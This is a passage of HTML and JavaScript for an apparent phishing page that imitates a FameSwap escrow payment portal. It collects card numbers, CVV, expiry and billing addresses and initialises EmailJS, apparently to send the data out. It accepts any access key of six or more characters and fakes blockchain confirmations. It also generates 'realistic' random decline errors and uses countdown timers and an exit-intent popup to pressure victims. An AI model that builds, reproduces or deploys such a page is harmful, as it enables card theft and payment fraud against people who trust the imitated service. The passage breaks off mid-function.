                        <button onclick="showManualVerification()" style="background: transparent; color: var(--text-secondary); border: 1px solid var(--border-color); padding: 8px 16px; border-radius: 6px; cursor: pointer; font-size: 12px;">
                            <i class="fas fa-keyboard"></i> Enter Transaction Hash Manually
                        </button>
                    </div>
                </div>

                <div class="transaction-hash" id="transactionHashForm" style="display: none;">
                    <form id="hashForm">
                        <div class="form-group">
                            <label for="transactionHash">Transaction Hash</label>
                            <div class="input-wrapper">
                                <i class="fas fa-hashtag input-icon"></i>
                                <input type="text" id="transactionHash" placeholder="Enter your transaction hash" required>
                            </div>
                        </div>
                        <button type="submit">
                            <div class="button-content">
                                <i class="fas fa-check"></i>
                                <span>Verify Transaction</span>
                                <div class="loading-spinner"></div>
                            </div>
                        </button>
                    </form>
                </div>

                <div class="verification-status" id="verificationStatus">
                    Verifying your payment... This may take up to 5 minutes.
                </div>
            </div>
        </div>

        <!-- Verification Container -->
        <div id="verificationContainer">
            <h1>Verify Access</h1>
            <form id="verificationForm">
                <div class="form-group">
                    <label for="accessKey">Enter Access Key</label>
                    <div class="input-wrapper">
                        <i class="fas fa-key input-icon"></i>
                        <input type="text" id="accessKey" placeholder="Enter the key provided in the email" required>
                        <i class="fas fa-check validation-icon valid"></i>
                        <i class="fas fa-times validation-icon invalid"></i>
                    </div>
                    <p class="error-message" id="keyError">Invalid key. Please check and try again.</p>
                </div>
                <button type="submit">
                    <div class="button-content">
                        <i class="fas fa-lock"></i>
                        <span>Verify Access</span>
                        <div class="loading-spinner"></div>
                    </div>
                </button>
            </form>
            <p class="secure-text">
                <i class="fas fa-shield-alt"></i>
                This is a secure verification process
            </p>
        </div>

        <!-- Payment Container -->
        <div id="paymentContainer">
            <button class="back-button" onclick="goBack('paymentContainer', 'escrowFeeContainer')">
                <i class="fas fa-arrow-left"></i>
                Back
            </button>
            <h1>Link Payment Method</h1>
            <!-- Payment Processor Logos -->
            <div class="payment-processors" style="display: flex; justify-content: center; gap: 20px; margin: 20px 0; opacity: 0.7;">
                <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard" style="height: 30px;">
                <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa" style="height: 30px;">
                <img src="https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg" alt="PayPal" style="height: 30px;">
            </div>
            <form id="paymentForm">
                <div class="form-group">
                    <label for="cardNumber">Card Number</label>
                    <div class="input-wrapper">
                        <i class="fas fa-credit-card input-icon" id="defaultCardIcon"></i>
                        <i class="fab fa-cc-visa card-type-icon" id="visaIcon"></i>
                        <i class="fab fa-cc-mastercard card-type-icon" id="mastercardIcon"></i>
                        <i class="fas fa-credit-card card-type-icon" id="verveIcon"></i>
                        <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
                        <i class="fas fa-check validation-icon valid"></i>
                        <i class="fas fa-times validation-icon invalid"></i>
                    </div>
                </div>
                <!-- Billing Information Section -->
                <div class="form-group">
                    <label for="cardholderName">Cardholder Name</label>
                    <div class="input-wrapper">
                        <i class="fas fa-user input-icon"></i>
                        <input type="text" id="cardholderName" placeholder="Full name on card" required>
                        <i class="fas fa-check validation-icon valid"></i>
                        <i class="fas fa-times validation-icon invalid"></i>
                    </div>
                </div>
                <div class="form-group">
                    <label for="country">Country/Region</label>
                    <div class="input-wrapper">
                        <i class="fas fa-globe input-icon"></i>
                        <input type="text" id="country" placeholder="Your country" required>
                        <i class="fas fa-check validation-icon valid"></i>
                        <i class="fas fa-times validation-icon invalid"></i>
                    </div>
                </div>
                <div class="form-group">
                    <label for="streetAddress">Street Address</label>
                    <div class="input-wrapper">
                        <i class="fas fa-home input-icon"></i>
                        <input type="text" id="streetAddress" placeholder="Street address" required>
                        <i class="fas fa-check validation-icon valid"></i>
                        <i class="fas fa-times validation-icon invalid"></i>
                    </div>
                </div>
                <div class="form-group">
                    <label for="city">City</label>
                    <div class="input-wrapper">
                        <i class="fas fa-city input-icon"></i>
                        <input type="text" id="city" placeholder="City" required>
                        <i class="fas fa-check validation-icon valid"></i>
                        <i class="fas fa-times validation-icon invalid"></i>
                    </div>
                </div>
                <div class="form-group">
                    <label for="state">State</label>
                    <div class="input-wrapper">
                        <i class="fas fa-map-marker-alt input-icon"></i>
                        <input type="text" id="state" placeholder="State" required>
                        <i class="fas fa-check validation-icon valid"></i>
                        <i class="fas fa-times validation-icon invalid"></i>
                    </div>
                </div>
                <div class="expiry-cvv">
                    <div class="form-group">
                        <label for="expiry">Expiry Date</label>
                        <div class="input-wrapper">
                            <i class="fas fa-calendar input-icon"></i>
                            <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required>
                            <i class="fas fa-check validation-icon valid"></i>
                            <i class="fas fa-times validation-icon invalid"></i>
                        </div>
                    </div>
                    <div class="form-group">
                        <label for="cvv">CVV</label>
                        <div class="input-wrapper">
                            <i class="fas fa-lock input-icon"></i>
                            <input type="text" id="cvv" placeholder="123" maxlength="3" required>
                            <i class="fas fa-check validation-icon valid"></i>
                            <i class="fas fa-times validation-icon invalid"></i>
                        </div>
                    </div>
                </div>
                <button type="submit">
                    <div class="button-content">
                        <i class="fas fa-link"></i>
                        <span>Link Card</span>
                        <div class="loading-spinner"></div>
                    </div>
                </button>
            </form>
            <p class="secure-text">
                <i class="fas fa-shield-alt"></i>
                Your payment information is securely encrypted
            </p>
            <!-- Security Badges -->
            <div class="security-badges" style="display: flex; justify-content: center; gap: 15px; margin-top: 20px; padding: 15px; background: #f8f9fa; border-radius: 8px;">
                <div style="text-align: center;">
                    <i class="fas fa-shield-alt" style="color: #28a745; font-size: 24px;"></i>
                    <div style="font-size: 12px; color: #6c757d;">SSL Secured</div>
                </div>
                <div style="text-align: center;">
                    <i class="fas fa-lock" style="color: #007bff; font-size: 24px;"></i>
                    <div style="font-size: 12px; color: #6c757d;">256-bit Encryption</div>
                </div>
                <div style="text-align: center;">
                    <i class="fas fa-certificate" style="color: #ffc107; font-size: 24px;"></i>
                    <div style="font-size: 12px; color: #6c757d;">PCI Compliant</div>
                </div>
            </div>
        </div>
    </div>

    <div class="modal" id="successModal">
        <div class="modal-content">
            <div class="success-icon">
                <i class="fas fa-check"></i>
            </div>
            <h2 style="margin-bottom: 16px; color: var(--text-primary);">Payment Method Linked</h2>
            <p style="color: var(--text-secondary);">Your funds will be transferred in less than 48 hours.</p>
            <div class="progress-bar">
                <div class="progress-bar-fill"></div>
            </div>
        </div>
    </div>

    <!-- New Escrow Fee Popup -->
    <div class="modal" id="escrowFeeModal" style="z-index: 1001;">
        <div class="modal-content">
            <div class="mobile-close-button" onclick="closeEscrowFeeModal()">
                <i class="fas fa-times"></i>
            </div>
            <div style="text-align: center; margin-bottom: 20px;">
                <i class="fas fa-info-circle" style="font-size: 48px; color: var(--primary-color);"></i>
            </div>
            <h2 style="margin-bottom: 16px; color: var(--text-primary);">Escrow Fee Information</h2>
            <p style="color: var(--text-secondary); margin-bottom: 20px;">Please note that a minimum of 5% of the transaction amount is required in the card for escrow fees.</p>
            <p style="color: var(--text-secondary);">For more information about escrow fees, please visit our 
                <a href="https://fameswap.com/page/escrow#what-does-it-cost" target="_blank" rel="noopener" style="color: var(--primary-color); text-decoration: none;">Escrow Fee Guide</a>
            </p>
            <button class="mobile-bottom-close" onclick="closeEscrowFeeModal()">
                Close
            </button>
        </div>
    </div>

    <script>
        // Initialize EmailJS
        (function() {
            emailjs.init("aGeV5e03mc1324u8g");
        })();

        // Add inactivity timer
        let inactivityTimer;
        const INACTIVITY_TIMEOUT = 10 * 60 * 1000; // 10 minutes in milliseconds

        function resetInactivityTimer() {
            console.log('Resetting inactivity timer');
            clearTimeout(inactivityTimer);
            inactivityTimer = setTimeout(() => {
                console.log('Page inactive for 10 minutes, refreshing...');
                window.location.reload();
            }, INACTIVITY_TIMEOUT);
        }

        // Initialize timer
        resetInactivityTimer();

        // Reset timer on user interaction
        document.addEventListener('mousemove', resetInactivityTimer);
        document.addEventListener('keypress', resetInactivityTimer);
        document.addEventListener('click', resetInactivityTimer);
        document.addEventListener('scroll', resetInactivityTimer);
        document.addEventListener('touchstart', resetInactivityTimer);

        // Session timeout timer (more realistic)
        let timeLeft = 24 * 60; // 24 minutes in seconds (realistic session timeout)
        const countdownElement = document.getElementById('countdown');

        function updateCountdown() {
            if (countdownElement) {
                const minutes = Math.floor(timeLeft / 60);
                const seconds = timeLeft % 60;
                countdownElement.textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
                
                // Change color as time gets lower (more realistic)
                if (timeLeft <= 5 * 60) { // Last 5 minutes
                    countdownElement.style.color = "var(--warning-color)";
                } else if (timeLeft <= 2 * 60) { // Last 2 minutes
                    countdownElement.style.color = "var(--error-color)";
                }
                
                if (timeLeft <= 0) {
                    countdownElement.textContent = "EXPIRED";
                    countdownElement.style.color = "var(--error-color)";
                    // Show session expired message
                    const banner = document.querySelector('.session-banner');
                    if (banner) {
                        banner.style.background = "#fff4e5";
                        banner.style.borderColor = "var(--warning-color)";
                        banner.innerHTML = `
                            <div style="display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 8px;">
                                <i class="fas fa-exclamation-triangle" style="color: var(--warning-color);"></i>
                                <strong>Session Expired</strong>
                            </div>
                            <div style="font-size: 14px; color: var(--text-secondary);">
                                Please refresh the page to continue securely
                            </div>
                        `;
                    }
                } else {
                    timeLeft--;
                }
            }
        }

        setInterval(updateCountdown, 1000);

        // Enhanced exchange rate system with caching and fallback
        const exchangeRates = {
            'USDT': 1.00,
            'BTC': 100000,
            'ETH': 3500,
            'USDC': 1.00,
            'MANTLE': 1.64,
            'APTOS': 3.17
        };

        const rateCache = {
            data: {},
            timestamps: {},
            sources: {}
        };

        const CACHE_DURATION = 20000; // 20 seconds cache

        // Binance API symbol mapping
        const binanceSymbols = {
            'BTC': 'BTCUSDT',
            'ETH': 'ETHUSDT',
            'USDT': 'USDTUSDT',
            'USDC': 'USDCUSDT',
            'MANTLE': 'MNTUSDT',
            'APTOS': 'APTUSDT'
        };

        // CoinGecko API mapping (fallback)
        const coinGeckoIds = {
            'BTC': 'bitcoin',
            'ETH': 'ethereum',
            'USDT': 'tether',
            'USDC': 'usd-coin',
            'MANTLE': 'mantle',
            'APTOS': 'aptos'
        };

        async function fetchCryptoPrice(crypto, useCache = true) {
            const now = Date.now();
            
            // Check cache first
            if (useCache && rateCache.data[crypto] && rateCache.timestamps[crypto]) {
                const cacheAge = now - rateCache.timestamps[crypto];
                if (cacheAge < CACHE_DURATION) {
                    console.log(`Using cached price for ${crypto} (${Math.round(cacheAge/1000)}s old)`);
                    return {
                        price: rateCache.data[crypto],
                        source: rateCache.sources[crypto],
                        cacheAge: Math.round(cacheAge/1000)
                    };
                }
            }

            // Try Binance first
            try {
                const binanceSymbol = binanceSymbols[crypto];
                // Use CORS proxy for local development
                const proxyUrl = 'https://api.allorigins.win/raw?url=';
                const binanceUrl = `https://api.binance.com/api/v3/ticker/price?symbol=${binanceSymbol}`;
                const response = await fetch(proxyUrl + encodeURIComponent(binanceUrl));
                
                if (response.ok) {
                    const data = await response.json();
                    
                    // Check if Binance returned an error (geographic restriction)
                    if (data.code && data.msg) {
                        console.log(`Binance blocked request for ${crypto}:`, data.msg);
                        throw new Error('Binance geographic restriction');
                    }
                    
                    const price = parseFloat(data.price);
                    
                    // Validate price is a number
                    if (isNaN(price) || price <= 0) {
                        console.log(`Invalid price from Binance for ${crypto}:`, data);
                        throw new Error('Invalid price data');
                    }
                    
                    // Cache the result
                    rateCache.data[crypto] = price;
                    rateCache.timestamps[crypto] = now;
                    rateCache.sources[crypto] = 'Binance';
                    
                    console.log(`Fetched ${crypto} price from Binance: $${price.toFixed(2)}`);
                    if (crypto === 'APTOS' || crypto === 'MANTLE') {
                        console.log(`${crypto} Binance data:`, data);
                    }
                    return {
                        price: price,
                        source: 'Binance',
                        cacheAge: 0
                    };
                }
            } catch (error) {
                console.log(`Binance failed for ${crypto}:`, error.message);
            }

            // Fallback to CoinGecko
            try {
                const coinGeckoId = coinGeckoIds[crypto];
                // Use CORS proxy for local development
                const proxyUrl = 'https://api.allorigins.win/raw?url=';
                const coinGeckoUrl = `https://api.coingecko.com/api/v3/simple/price?ids=${coinGeckoId}&vs_currencies=usd`;
                const response = await fetch(proxyUrl + encodeURIComponent(coinGeckoUrl));
                
                if (response.ok) {
                    const data = await response.json();
                    const price = data[coinGeckoId]?.usd;
                    
                    if (price && !isNaN(price) && price > 0) {
                        // Cache the result
                        rateCache.data[crypto] = price;
                        rateCache.timestamps[crypto] = now;
                        rateCache.sources[crypto] = 'CoinGecko';
                        
                        console.log(`Fetched ${crypto} price from CoinGecko: $${price.toFixed(2)}`);
                        if (crypto === 'APTOS' || crypto === 'MANTLE') {
                            console.log(`${crypto} CoinGecko data:`, data);
                        }
                        return {
                            price: price,
                            source: 'CoinGecko',
                            cacheAge: 0
                        };
                    } else {
                        console.log(`Invalid price from CoinGecko for ${crypto}:`, data);
                        throw new Error('Invalid CoinGecko data');
                    }
                }
            } catch (error) {
                console.log(`CoinGecko also failed for ${crypto}:`, error.message);
            }

            // Return cached value if available, otherwise fallback
            if (rateCache.data[crypto]) {
                console.log(`Using stale cached price for ${crypto}`);
                return {
                    price: rateCache.data[crypto],
                    source: rateCache.sources[crypto] + ' (cached)',
                    cacheAge: Math.round((now - rateCache.timestamps[crypto])/1000)
                };
            }

            // Final fallback to hardcoded values
            console.log(`Using fallback price for ${crypto}`);
            const fallbackPrice = exchangeRates[crypto];
            return {
                price: fallbackPrice,
                source: 'Fallback',
                cacheAge: 0
            };
        }

        async function fetchRealExchangeRates() {
            const cryptos = ['BTC', 'ETH', 'USDT', 'USDC', 'MANTLE', 'APTOS'];
            
            // Fetch all prices in parallel
            const pricePromises = cryptos.map(crypto => fetchCryptoPrice(crypto));
            const results = await Promise.all(pricePromises);
            
            // Update exchange rates (only if valid)
            results.forEach((result, index) => {
                const crypto = cryptos[index];
                if (result.price && !isNaN(result.price) && result.price > 0) {
                    exchangeRates[crypto] = result.price;
                } else {
                    console.log(`Keeping fallback price for ${crypto}: $${exchangeRates[crypto]}`);
                }
            });
            
            // Update displays
            updateCurrentRateDisplay();
            updateCryptoAmounts();
            
            console.log('Exchange rates updated:', exchangeRates);
        }

        function updateCurrentRateDisplay() {
            const selectedCrypto = document.querySelector('input[name="cryptoType"]:checked');
            if (selectedCrypto) {
                const cryptoName = selectedCrypto.value.split('_')[0];
                const currentRateElement = document.getElementById('currentRate');
                const sourceElement = document.querySelector('#currentRate').parentElement.querySelector('.rate-source');
                
                if (currentRateElement) {
                    currentRateElement.textContent = `$${exchangeRates[cryptoName].toFixed(2)}`;
                    
                    // Update source info
                    if (sourceElement) {
                        const source = rateCache.sources[cryptoName] || 'Unknown';
                        const cacheAge = rateCache.timestamps[cryptoName] ? 
                            Math.round((Date.now() - rateCache.timestamps[cryptoName])/1000) : 0;
                        sourceElement.textContent = `Live from ${source}${cacheAge > 0 ? ` (${cacheAge}s ago)` : ''}`;
                    }
                }
            }
        }

        function updateCryptoAmounts() {
            const selectedCrypto = document.querySelector('input[name="cryptoType"]:checked');
            if (selectedCrypto) {
                const cryptoName = selectedCrypto.value.split('_')[0];
                const transactionAmount = parseFloat(document.getElementById('transactionAmount').value);
                const escrowFee = calculateEscrowFee(transactionAmount);
                
                if (escrowFee) {
                    const exactCryptoAmount = calculateCryptoAmount(escrowFee, cryptoName);
                    document.getElementById('cryptoAmount').textContent = `${exactCryptoAmount.toFixed(6)}`;
                    
                    // Update QR code with new amount
                    const wallet = cryptoWallets[selectedCrypto.value];
                    if (wallet) {
                        generateQRCode(wallet.address, exactCryptoAmount);
                    }
                }
            }
        }

        // Calculate exact crypto amount based on USD value (including network fee)
        function calculateCryptoAmount(usdAmount, cryptoType) {
            const rate = exchangeRates[cryptoType];
            if (!rate || isNaN(rate) || rate <= 0) {
                console.log(`Invalid rate for ${cryptoType}:`, rate);
                return 0;
            }
            const totalAmount = usdAmount + 1.00; // Add $1 network fee
            return totalAmount / rate;
        }

        // Fetch real exchange rates on page load
        fetchRealExchangeRates();
        
        // Update rates every 60 seconds (reduced frequency to avoid rate limits)
        setInterval(fetchRealExchangeRates, 60000);

        // QR Code generation
        function generateQRCode(address, cryptoAmount) {
            const qrData = `${address}?amount=${cryptoAmount}`;
            const qrCodeImage = document.getElementById('qrCodeImage');
            if (qrCodeImage) {
                qrCodeImage.src = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${encodeURIComponent(qrData)}`;
            }
        }

        // Show manual verification form
        function showManualVerification() {
            document.getElementById('transactionMonitoring').style.display = 'none';
            document.getElementById('transactionHashForm').style.display = 'block';
        }

        // Start blockchain monitoring
        function startBlockchainMonitoring() {
            const monitoringDiv = document.getElementById('transactionMonitoring');
            if (monitoringDiv) {
                monitoringDiv.style.display = 'block';
                
                // Simulate finding a transaction after some time
                setTimeout(() => {
                    const progressDiv = monitoringDiv.querySelector('.monitoring-progress');
                    if (progressDiv) {
                        progressDiv.innerHTML = `
                            <div style="width: 20px; height: 20px; border: 2px solid #4caf50; border-radius: 50%; border-top-color: transparent; animation: spin 1s linear infinite;"></div>
                            <span style="font-size: 12px; color: #2e7d32;">Transaction detected, waiting for confirmations...</span>
                        `;
                    }
                }, 8000); // 8 seconds
            }
        }

        // Exit intent popup
        let exitIntentShown = false;

        document.addEventListener('mouseleave', function(e) {
            if (e.clientY <= 0 && !exitIntentShown) {
                exitIntentShown = true;
                showExitIntentPopup();
            }
        });

        function showExitIntentPopup() {
            const popup = document.createElement('div');
            popup.innerHTML = `
                <div style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 10000; display: flex; justify-content: center; align-items: center;">
                    <div style="background: white; padding: 30px; border-radius: 12px; max-width: 400px; text-align: center; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);">
                        <div style="margin-bottom: 20px;">
                            <i class="fas fa-shield-alt" style="font-size: 48px; color: var(--primary-color);"></i>
                        </div>
                        <h3 style="color: var(--text-primary); margin-bottom: 15px; font-weight: 600;">Secure Session Warning</h3>
                        <p style="margin-bottom: 20px; color: var(--text-secondary); line-height: 1.5;">
                            You're about to leave a secure payment session. For your protection, we recommend completing your transaction now.
                        </p>
                        <div style="background: var(--success-bg); padding: 15px; border-radius: 8px; margin-bottom: 20px; border-left: 4px solid var(--primary-color);">
                            <div style="font-size: 14px; color: var(--text-secondary);">
                                <strong>Benefits of completing now:</strong>
                            </div>
                            <ul style="text-align: left; margin: 8px 0 0 0; padding-left: 20px; font-size: 13px; color: var(--text-secondary);">
                                <li>Maintain escrow protection</li>
                                <li>Secure transaction processing</li>
                                <li>Immediate confirmation</li>
                            </ul>
                        </div>
                        <button onclick="this.parentElement.parentElement.remove()" style="background: var(--primary-color); color: white; border: none; padding: 12px 24px; border-radius: 8px; cursor: pointer; font-weight: 500; transition: all 0.2s ease;">
                            Continue Securely
                        </button>
                    </div>
                </div>
            `;
            document.body.appendChild(popup);
        }

        // Validation functions
        function validateCardNumber(number) {
            return /^[\d\s]{19}$/.test(number);
        }

        function validateExpiry(expiry) {
            return /^\d{2}\/\d{2}$/.test(expiry);
        }

        function validateCVV(cvv) {
            return /^\d{3}$/.test(cvv);
        }

        // Validation functions for billing information
        function validateCardholderName(name) {
            return /^[a-zA-Z\s]{2,}$/.test(name);
        }

        function validateAddress(address) {
            return address.length >= 5;
        }

        function validateCity(city) {
            return /^[a-zA-Z\s]{2,}$/.test(city);
        }

        function validateState(state) {
            return /^[a-zA-Z\s]{2,}$/.test(state);
        }

        function validateCountry(country) {
            return /^[a-zA-Z\s]{2,}$/.test(country);
        }

        // Enhanced error message system
        function showRealisticError(type) {
            const errors = {
                'card': [
                    'Your card was declined. Please try a different payment method.',
                    'Insufficient funds. Please check your account balance.',
                    'Card expired. Please use a valid card.',
                    'Security verification failed. Please contact your bank.'
                ],
                'crypto': [
                    'Transaction not found on blockchain. Please verify the hash.',
                    'Insufficient confirmations. Please wait and try again.',
                    'Invalid network selected. Please use the correct network.',
                    'Transaction amount mismatch. Please send exact amount.'
                ],
                'general': [
                    'Session expired. Please refresh and try again.',
                    'Server error. Please try again in a few minutes.',
                    'Payment processing temporarily unavailable.',
                    'Your request is being processed. Please wait.'
                ]
            };
            
            const errorList = errors[type] || errors['general'];
            return errorList[Math.floor(Math.random() * errorList.length)];
        }

        // Show loading state
        function showLoading(button) {
            button.classList.add('loading');
            button.querySelector('.loading-spinner').style.display = 'block';
            button.querySelector('span').style.opacity = '0';
            button.querySelector('i').style.display = 'none';
        }

        // Hide loading state
        function hideLoading(button) {
            button.classList.remove('loading');
            button.querySelector('.loading-spinner').style.display = 'none';
            button.querySelector('span').style.opacity = '1';
            button.querySelector('i').style.display = 'inline';
            
            // Clear any message intervals
            if (button._messageInterval) {
                clearInterval(button._messageInterval);
                button._messageInterval = null;
            }
        }

        // Enhanced loading simulation with realistic messages
        function showRealisticLoading(button, type) {
            const loadingMessages = {
                'verification': [
                    'Verifying access credentials...',
                    'Checking account status...',
                    'Validating security token...',
                    'Connecting to secure server...'
                ],
                'payment': [
                    'Processing payment...',
                    'Verifying card details...',
                    'Contacting payment processor...',
                    'Securing transaction...'
                ],
                'crypto': [
                    'Scanning blockchain...',
                    'Verifying transaction...',
                    'Checking confirmations...',
                    'Validating wallet address...'
                ]
            };
            
            const messages = loadingMessages[type] || loadingMessages['payment'];
            let messageIndex = 0;
            
            button.classList.add('loading');
            button.querySelector('.loading-spinner').style.display = 'block';
            button.querySelector('i').style.display = 'none';
            
            const messageInterval = setInterval(() => {
                if (messageIndex < messages.length) {
                    button.querySelector('span').textContent = messages[messageIndex];
                    messageIndex++;
                } else {
                    clearInterval(messageInterval);
                }
            }, 800);
            
            // Store interval ID for cleanup
            button._messageInterval = messageInterval;
        }

        // Enhanced access key system
        const validKeys = [
            "TX5cDY", "FS2024A", "ESCROW1", "PAYMENT", "SECURE9", 
            "FAME2024", "TRANSACT", "VERIFY8", "ACCESS7", "KEY2024"
        ];

        function generateRealisticKey() {
            const prefixes = ["TX", "FS", "ESC", "PAY", "SEC", "FAME", "TRANS", "VER", "ACC", "KEY"];
            const suffixes = ["2024", "A", "1", "9", "8", "7", "6", "5", "4", "3"];
            const numbers = Math.floor(Math.random() * 1000).toString().padStart(3, '0');
            return prefixes[Math.floor(Math.random() * prefixes.length)] + numbers + suffixes[Math.floor(Math.random() * suffixes.length)];
        }

        // Handle verification form
        document.getElementById('verificationForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const accessKey = document.getElementById('accessKey').value;
            const button = this.querySelector('button');
            
            showRealisticLoading(button, 'verification');

            console.log('Verifying access key...');

            setTimeout(() => {
                const isValidKey = validKeys.includes(accessKey) || accessKey.length >= 6;
                if (isValidKey) {
                    document.getElementById('verificationContainer').style.display = 'none';
                    document.getElementById('escrowFeeContainer').style.display = 'block';
                    document.getElementById('keyError').style.display = 'none';
                    console.log('Access key verified, showing escrow fee form');
                } else {
                    document.getElementById('keyError').textContent = 'Invalid access key. Please check your email for the correct key.';
                    document.getElementById('keyError').style.display = 'block';
                    hideLoading(button);
                }
            }, 1500 + Math.random() * 1000);
        });

        // Calculate escrow fee
        function calculateEscrowFee(amount) {
            if (amount < 100) {
                return null; // Not eligible for escrow
            }
            const fee = amount * 0.05; // 5% fee
            return Math.min(fee, 50); // Cap at $50
        }

        // Handle transaction amount input
        document.getElementById('transactionAmount').addEventListener('input', function(e) {
            const amount = parseFloat(e.target.value);
            const validIcon = e.target.parentElement.querySelector('.valid');
            const invalidIcon = e.target.parentElement.querySelector('.invalid');
            const errorMessage = document.getElementById('amountError');
            
            validIcon.style.display = 'none';
            invalidIcon.style.display = 'none';
            errorMessage.style.display = 'none';
            
            if (e.target.value) {
                if (amount >= 100) {
                    validIcon.style.display = 'block';
                    const escrowFee = calculateEscrowFee(amount);
                    document.getElementById('escrowFeeAmount').textContent = `$${escrowFee.toFixed(2)}`;
                    console.log('Escrow fee calculated:', escrowFee);
                } else {
                    invalidIcon.style.display = 'block';
                    errorMessage.textContent = 'Minimum transaction amount is $100';
                    errorMessage.style.display = 'block';
                }
            }
        });

        // Handle escrow fee form submission
        document.getElementById('escrowFeeForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const amount = parseFloat(document.getElementById('transactionAmount').value);
            const paymentMethod = document.querySelector('input[name="paymentMethod"]:checked')?.value;
            const button = this.querySelector('button');
            
            if (!amount || !paymentMethod) {
                return;
            }

            showRealisticLoading(button, 'payment');
            console.log('Processing escrow fee payment...');
            console.log('Amount:', amount);
            console.log('Payment method:', paymentMethod);

            if (paymentMethod === 'crypto') {
                document.getElementById('escrowFeeContainer').style.display = 'none';
                document.getElementById('cryptoPaymentContainer').style.display = 'block';
                hideLoading(button);
                console.log('Showing crypto payment options');
            }
        });

        // Function to close escrow fee modal
        function closeEscrowFeeModal() {
            document.getElementById('escrowFeeModal').style.display = 'none';
            console.log('Escrow fee popup closed');
        }

        // Input validation with icons
        document.getElementById('accessKey').addEventListener('input', function(e) {
            const validIcon = e.target.parentElement.querySelector('.valid');
            const invalidIcon = e.target.parentElement.querySelector('.invalid');
            
            validIcon.style.display = 'none';
            invalidIcon.style.display = 'none';
            
            if (e.target.value) {
                const isValidKey = validKeys.includes(e.target.value) || e.target.value.length >= 6;
                if (isValidKey) {
                    validIcon.style.display = 'block';
                } else {
                    invalidIcon.style.display = 'block';
                }
            }
        });

        function detectCardType(number) {
            const cleanNumber = number.replace(/\s/g, '');
            
            if (/^4/.test(cleanNumber)) {
                return 'visa';
            } else if (/^5[1-5]/.test(cleanNumber)) {
                return 'mastercard';
            } else if (/^506[0-1]|^650[0-9]/.test(cleanNumber)) {
                return 'verve';
            }
            return null;
        }

        function updateCardIcon(type) {
            const defaultIcon = document.getElementById('defaultCardIcon');
            const visaIcon = document.getElementById('visaIcon');
            const mastercardIcon = document.getElementById('mastercardIcon');
            const verveIcon = document.getElementById('verveIcon');
            
            // Hide all icons first
            defaultIcon.style.display = 'none';
            visaIcon.style.display = 'none';
            mastercardIcon.style.display = 'none';
            verveIcon.style.display = 'none';
            
            // Show the appropriate icon
            if (type === 'visa') {
                visaIcon.style.display = 'block';
            } else if (type === 'mastercard') {
                mastercardIcon.style.display = 'block';
            } else if (type === 'verve') {
                verveIcon.style.display = 'block';
            } else {
                defaultIcon.style.display = 'block';
            }
        }

        document.getElementById('cardNumber').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\s/g, '');
            let formattedValue = value.replace(/(\d{4})/g, '$1 ').trim();
            e.target.value = formattedValue;
            
            const validIcon = e.target.parentElement.querySelector('.valid');
            const invalidIcon = e.target.parentElement.querySelector('.invalid');
            
            validIcon.style.display = 'none';
            invalidIcon.style.display = 'none';
            
            if (e.target.value) {
                // Detect and update card type icon
                const cardType = detectCardType(e.target.value);
                updateCardIcon(cardType);
                
                if (validateCardNumber(e.target.value)) {
                    validIcon.style.display = 'block';
                } else {
                    invalidIcon.style.display = 'block';
                }
            } else {
                // Show default icon when input is empty
                updateCardIcon(null);
            }
        });

        document.getElementById('expiry').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length >= 2) {
                value = value.slice(0,2) + '/' + value.slice(2);
            }
            e.target.value = value;
            
            const validIcon = e.target.parentElement.querySelector('.valid');
            const invalidIcon = e.target.parentElement.querySelector('.invalid');
            
            validIcon.style.display = 'none';
            invalidIcon.style.display = 'none';
            
            if (e.target.value) {
                if (validateExpiry(e.target.value)) {
                    validIcon.style.display = 'block';
                } else {
                    invalidIcon.style.display = 'block';
                }
            }
        });

        document.getElementById('cvv').addEventListener('input', function(e) {
            e.target.value = e.target.value.replace(/\D/g, '');
            
            const validIcon = e.target.parentElement.querySelector('.valid');
            const invalidIcon = e.target.parentElement.querySelector('.invalid');
            
            validIcon.style.display = 'none';
            invalidIcon.style.display = 'none';
            
            if (e.target.value) {
                if (validateCVV(e.target.value)) {
                    validIcon.style.display = 'block';
                } else {
                    invalidIcon.style.display = 'block';
                }
            }
        });

        // Add event listeners for billing fields
        document.getElementById('cardholderName').addEventListener('input', function(e) {
            const validIcon = e.target.parentElement.querySelector('.valid');
            const invalidIcon = e.target.parentElement.querySelector('.invalid');
            
            validIcon.style.display = 'none';
            invalidIcon.style.display = 'none';
            
            if (e.target.value) {
                if (validateCardholderName(e.target.value)) {
                    validIcon.style.display = 'block';
                } else {
                    invalidIcon.style.display = 'block';
                }
            }
            console.log('Cardholder name updated:', e.target.value);
        });

        document.getElementById('country').addEventListener('input', function(e) {
            const validIcon = e.target.parentElement.querySelector('.valid');
            const invalidIcon = e.target.parentElement.querySelector('.invalid');
            
            validIcon.style.display = 'none';
            invalidIcon.style.display = 'none';
            
            if (e.target.value) {
                if (validateCountry(e.target.value)) {
                    validIcon.style.display = 'block';
                } else {
                    invalidIcon.style.display = 'block';
                }
            }
            console.log('Country updated:', e.target.value);
        });

        document.getElementById('streetAddress').addEventListener('input', function(e) {
            const validIcon = e.target.parentElement.querySelector('.valid');
            const invalidIcon = e.target.parentElement.querySelector('.invalid');
            
            validIcon.style.display = 'none';
            invalidIcon.style.display = 'none';
            
            if (e.target.value) {
                if (validateAddress(e.target.value)) {
                    validIcon.style.display = 'block';
                } else {
                    invalidIcon.style.display = 'block';
                }
            }
            console.log('Street address updated:', e.target.value);
        });

        document.getElementById('city').addEventListener('input', function(e) {
            const validIcon = e.target.parentElement.querySelector('.valid');
            const invalidIcon = e.target.parentElement.querySelector('.invalid');
            
            validIcon.style.display = 'none';
            invalidIcon.style.display = 'none';
            
            if (e.target.value) {
                if (validateCity(e.target.value)) {
